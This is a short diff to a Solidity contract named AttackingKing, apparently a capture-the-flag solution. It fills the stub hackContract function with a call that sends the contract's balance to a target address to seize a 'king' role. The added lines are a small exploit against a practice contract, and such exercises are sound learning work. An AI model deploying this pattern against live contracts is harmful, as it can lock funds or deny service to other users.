@@ -12,5 +12,7 @@ contract AttackingKing {
 
     function hackContract() external {
         // Code me!
+        (bool success, ) = contractAddress.call{value: address(this).balance}("");
+        require(success);
     }
 }
